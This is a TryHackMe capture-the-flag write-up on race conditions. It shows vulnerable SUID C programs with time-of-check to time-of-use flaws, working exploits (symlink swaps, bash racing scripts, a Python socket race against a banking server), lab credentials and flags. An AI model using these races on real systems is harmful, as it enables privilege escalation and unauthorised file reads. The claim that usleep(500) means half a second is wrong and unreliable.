# TryHackMe: Race Conditions

## Challenge Description

Within the home directories of **Walk**, **Run**, and **Sprint**, you will encounter a vulnerable SUID binary, its C source code, and a flag. Your mission is to exploit the binary, granting you the ability to read the user's flag.

While the challenges are independent and can be tackled in any sequence, beginners are advised to commence with **Walk**.

> **Note:** Post initialization, please allocate 3-5 minutes for the VM to stabilize. Secure a connection to the provided VM using SSH and the credentials below:
> 
> - **Username:** race
> - **Password:** car

---

## Challenge: Walk

### Overview

The **Walk** directory houses an executable (`anti_flag_reader`), accompanied by its source code (`anti_flag_reader.c`) and a concealed `flag` file. This challenge revolves around exploiting `anti_flag_reader` to unveil the `flag` file.

### Files

#### Directory Listing

```bash
race@car:~$ ls -all /home/walk
total 44
-rwsr-sr-x 1 walk walk 16368 Mar 27 19:14 anti_flag_reader
-rw-r--r-- 1 walk walk  1071 Mar 27 19:10 anti_flag_reader.c
-rw------- 1 walk walk    41 Mar 27 12:41 flag
```

#### anti_flag_reader.c

The program conducts a preliminary check to ascertain if the given file's moniker incorporates the term "flag" or qualifies as a symbolic link. A positive validation results in the program's refusal to read the file. Contrarily, it strives to open the file, subsequently displaying its contents.

```c
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <assert.h>
#include <sys/stat.h>

int main(int argc, char **argv, char **envp) {
    int n;
    char buf[1024];
    struct stat lstat_buf;

    if (argc != 2) {
        puts("Usage: anti_flag_reader <FILE>");
        return 1;
    }
    
    puts("Checking if 'flag' is in the provided file path...");
    int path_check = strstr(argv[1], "flag");
    puts("Checking if the file is a symlink...");
    lstat(argv[1], &lstat_buf);
    int symlink_check = (S_ISLNK(lstat_buf.st_mode));
    puts("<Press Enter to continue>");
    getchar();
    
    if (path_check || symlink_check) {
        puts("Nice try, but I refuse to give you the flag!");
        return 1;
    } else {
        puts("This file can't possibly be the flag. I'll print it out for you:\n");
        int fd = open(argv[1], 0);
        assert(fd >= 0 && "Failed to open the file");
        while((n = read(fd, buf, 1024)) > 0 && write(1, buf, n) > 0);
    }
    
    return 0;
}
```

### Exploitation

1. We ran the `anti_flag_reader` against a benign file `asdf`.
```bash
race@car:~$ touch asdf
race@car:~$ /home/walk/anti_flag_reader asdf
Checking if 'flag' is in the provided file path...
Checking if the file is a symlink...
<Press Enter to continue>
```

2. While the program awaited input, we deleted the `asdf` file and created a symlink pointing to the `flag` file.
```bash
race@car:~$ rm asdf 
race@car:~$ ln -s /home/walk/flag asdf
```

3. Going back to the first terminal, pressing `Enter` tricked the program into reading the `flag` file due to the symlink.
```bash
[ENTER]
This file can't possibly be the flag. I'll print it out for you:

THM{R4c3_c0nd1710n5_1n_7h3_f1l35y573m!}
```

### Conclusion

By leveraging a time-of-check to time-of-use (TOCTOU) race condition vulnerability in the `anti_flag_reader` program, we were able to read the contents of the `flag` file.


## Challenge: Run

### Overview

This write-up discusses a challenge aimed at exploiting a race condition vulnerability in a custom C program named `cat2`. The program is designed to be a "secure" version of the standard Unix `cat` command, performing additional checks on the user's security context before reading a file. Through this exploration, we demonstrate how two Bash scripts can exploit this race condition to potentially access a restricted file.

### Files

#### Directory Listing

```bash
race@car:~$ ls -all /home/run/
-rwsr-sr-x 1 run  run  16360 Mar 27 18:23 cat2
-rw-r--r-- 1 run  run   1378 Mar 27 18:21 cat2.c
-rw------- 1 run  run     46 Mar 27 12:41 flag
```

From the directory listing, we observe that the `cat2` binary has SUID (Set User ID upon execution) permissions, meaning it can execute with the permissions of its owner (`run` in this case). This makes exploiting the race condition even more critical as it can provide elevated access.

#### cat2.c

```c
#include <stdio.h>
#include <unistd.h>
#include <assert.h>

int main(int argc, char **argv, char **envp) {

    int fd;
    int n;
    int context; 
    char buf[1024];

    if (argc != 2) {
        puts("Usage: cat2 <FILE>");
        return 1;
    }

    puts("Welcome to cat2!");
    puts("This program is a side project I've been working on to be a more secure version of the popular cat command");
    puts("Unlike cat, the cat2 command performs additional checks on the user's security context");
    puts("This allows the command to be security compliant even if executed with SUID permissions!\n");
    puts("Checking the user's security context...");
    context = check_security_contex(argv[1]);
    puts("Context has been checked, proceeding!\n");

    if (context == 0) {
        puts("The user has access, outputting file...\n");
        fd = open(argv[1], 0);
        assert(fd >= 0 && "Failed to open the file");
        while((n = read(fd, buf, 1024)) > 0 && write(1, buf, n) > 0);
    } else {
        puts("[SECURITY BREACH] The user does not have access to this file!");
        puts("Terminating...");
        return 1;
    }
    
    return 0;
}

int check_security_contex(char *file_name) {

    int context_result;

    context_result = access(file_name, R_OK);
    usleep(500);

    return context_result;
}
```

#### cat2.c

The C code for `cat2` (as given above) represents the custom version of the `cat` command with added security features. It checks for the user's security context using the `check_security_contex` function. However, the presence of the `usleep(500)` function introduces a 0.5-second delay, making it vulnerable to race condition attacks.

### Vulnerability Analysis

The race condition is created due to the half-second delay (500 microseconds) present in the `check_security_contex` function. An attacker can use this window of time to swap out the file being checked for a symbolic link to another file. Because `cat2` operates with elevated privileges (due to SUID), if the race condition is successfully exploited, it could lead to the unauthorized reading of files owned by the `run` user, such as the `flag` file.

### Exploit

To exploit this vulnerability, two Bash scripts were crafted. 

#### `execute_program.sh`

This script, when run, will attempt to execute the `cat2` program ten times in rapid succession.

```bash
#!/bin/bash
max_attempts=10
delay_between_attempts=0

attempt=1
while [ "$attempt" -le "$max_attempts" ]; do
    program_to_execute="/home/run/cat2 /home/race/asdf"
    $program_to_execute &
    ((attempt++))
done

echo "Script completed after $max_attempts attempts."
```

#### `loop.sh`

This script is responsible for creating, deleting, and relinking files to exploit the timing window provided by the race condition.

```bash
#!/bin/bash
max_attempts=1
delay_between_attempts=0

attempt=1
while [ "$attempt" -le "$max_attempts" ]; do
    rm -f "/home/race/asdf"
    echo asdf > "/home/race/asdf"
    sleep $delay_between_attempts
    rm -f "/home/race/asdf"
    ln -s "/home/run/flag" "/home/race/asdf"
    echo 'Link happening now'
    ((attempt++))
done

echo "Script completed after $max_attempts attempts."
```

### Execution & Result

To exploit the vulnerability, both `execute_program.sh` and `loop.sh` are run in parallel. As `execute_program.sh` constantly attempts to access the `/home/race/asdf` file, `loop.sh` works in the background to swap this file with a symbolic link to `/home/run/flag`. When the timing aligns perfectly, `cat2` ends up reading the contents of `flag` instead of `asdf`, thereby successfully exploiting the race condition.

```bash
race@car:~$ ./loop.sh & ./execute_program.sh  &
...
[SECURITY BREACH] The user does not have access to this file!
Terminating...
This program is a side project I've been working on to be a more secure version of the popular cat command
Unlike cat, the cat2 command performs additional checks on the user's security context
This allows the command to be security compliant even if executed with SUID permissions!

Checking the user's security context...
Context has been checked, proceeding!

[SECURITY BREACH] The user does not have access to this file!
Terminating...
Context has been checked, proceeding!

[SECURITY BREACH] The user does not have access to this file!
Terminating...
THM{R4c1n6_f4573r_7h4n_y0ur_53cur17y_ch3ck5}
THM{R4c1n6_f4573r_7h4n_y0ur_53cur17y_ch3ck5}
```

### Conclusion

The race condition in `cat2` was successfully exploited using the Bash scripts. This case study serves as a reminder that even the introduction of tiny delays in security checks can open doors to potential vulnerabilities and that careful coding and thorough testing are essential, especially in applications running with elevated privileges.

## Challenge: Sprint Exploit

### Overview

This write-up focuses on exploiting a concurrency flaw in a custom C banking program titled `bankingsystem`. The banking system is intended to be a "secure" server that processes transactions such as deposits, withdrawals, and purchasing items (in this case, a flag). However, by leveraging the timing vulnerability present, we can demonstrate how an attacker could game the system and buy items without having the necessary funds.

### Files

#### Directory Listing

```bash
race@car:~$ ls -all /home/sprint/
-rwsr-sr-x 1 sprint sprint 17032 Mar 27 19:16 bankingsystem
-rw-r--r-- 1 sprint sprint  2888 Mar 27 19:15 bankingsystem.c
-rw-r--r-- 1 sprint sprint   220 Jan  6  2022 .bash_logout
-rw------- 1 sprint sprint    40 Mar 27 12:42 flag
```

From the listing, it's apparent that the `bankingsystem` binary also has SUID permissions, meaning it can execute with the permissions of its owner (`sprint` in this case). It's vital to note this, as the `flag` is owned by the `sprint` user and could be read if the system is compromised.

#### bankingsystem.c

The provided C code for `bankingsystem` shows a multi-threaded server application that listens on port `1337` and processes three possible commands: deposit, withdraw, and purchase flag. The core logic is centered around the `money` global variable. The server has a race condition due to the delay (`usleep(1)`) before the money is reset to `0`, allowing for potential exploitation.

### Vulnerability Analysis

The vulnerability stems from the fact that `money` is a shared global variable among all threads, and there's a small delay after sending the balance before the money is reset to `0`. This window of opportunity allows an attacker to make concurrent requests and game the system. Specifically, if one were to make simultaneous deposits while another request tries to purchase the flag, the checking of funds and the deduction of funds don't happen atomically, leading to a race condition.

### Exploit

The provided Python script exploits this concurrency flaw. It establishes three simultaneous connections:

1. The first socket deposits money.
2. The second socket also deposits money.
3. The third socket tries to purchase the flag.

Due to the race condition, it's possible that the `purchase flag` command gets processed after the two deposit commands have executed but before the `money` variable is reset. This would mean that the total balance, from the system's perspective, is sufficient to buy the flag even if the user didn't have enough funds initially.

```python
import socket

HOST = "10.10.117.19"
PORT = 1337

while True:  # Infinite loop
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s3 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((HOST, PORT))
    s2.connect((HOST, PORT))
    s3.connect((HOST, PORT))

    s.send('deposit'.encode('utf-8'))  # Encode the string to bytes
    s2.send('deposit'.encode('utf-8'))  # Encode the string to bytes
    s3.send("purchase flag".encode('utf-8'))  # Encode the string to bytes

    data1 = s.recv(1024).decode('utf-8')  # Decode the received data
    data2 = s2.recv(1024).decode('utf-8')  # Decode the received data
    data3 = s3.recv(1024).decode('utf-8')  # Decode the received data

    print(data1)
    print(data2)
    print(data3)

    # Close the sockets
    s.close()
    s2.close()
    s3.close()

    # Check if the flag was successfully purchased, if so, break out of the loop.
    if "THM" in data3:
        break
```

### Execution & Result

When the script is executed, it sends the three simultaneous requests repeatedly. Eventually, due to the race condition, the script manages to "purchase" the flag without technically having enough funds. The system responds with the flag, and the script stops its execution.

```bash
root@ip-10-10-113-232:~# python3 sprint.py 
Current balance: 10000

Current balance: 20000

THM{R4c1n6_f0r_7h47_5w337_m0n3y_$$$$$}
Current balance: 5000
```

### Conclusion

Concurrency issues, especially in multi-threaded applications, can be tricky. It's crucial for developers to ensure that shared resources, like the `money` variable in this case, are accessed in a thread-safe manner. Proper synchronization mechanisms like locks, semaphores, or atomic operations can help mitigate such race conditions. This challenge emphasizes the importance of understanding the implications of multi-threaded programming and the pitfalls of not adequately handling shared resources.